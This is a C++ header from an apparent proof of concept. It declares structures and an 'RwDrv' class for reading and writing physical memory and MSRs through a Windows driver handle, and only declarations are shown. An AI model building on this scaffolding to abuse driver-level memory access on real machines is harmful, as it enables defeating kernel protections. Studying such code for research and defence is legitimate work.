#ifndef PoC_H
#define PoC_H

#pragma once

#include <windows.h>
#include<stdint.h>
#include<stdio.h>
#include <string> 

struct PhysRW_t
{
	uint64_t PhysicalAddress;
	DWORD Size;
	DWORD Unknown;
	uint64_t Address;
};

struct RegRW_t
{
	DWORD Register;
	uint64_t Value;
};

struct MSRRW_t
{
	DWORD Low;
	DWORD Unknown;
	DWORD Register;
	DWORD High;
};

#define LAST_IND(x,part_type)    (sizeof(x)/sizeof(part_type) - 1)
#define HIGH_IND(x,part_type)  LAST_IND(x,part_type)
#define LOW_IND(x,part_type)   0
#define DWORDn(x, n)  (*((DWORD*)&(x)+n))
#define HIDWORD(x) DWORDn(x,HIGH_IND(x,DWORD))
#define __PAIR64__(high, low)   (((uint64_t) (high) << 32) | (uint32_t)(low))

class RwDrv
{
public:
	RwDrv();
	~RwDrv();

	void PhysicalRead(uint64_t Address, uint64_t* Address2, DWORD Size);
	void PhysicalWrite(uint64_t Address, uint64_t* Address2, DWORD Size);

private:
	HANDLE h;
};

#endif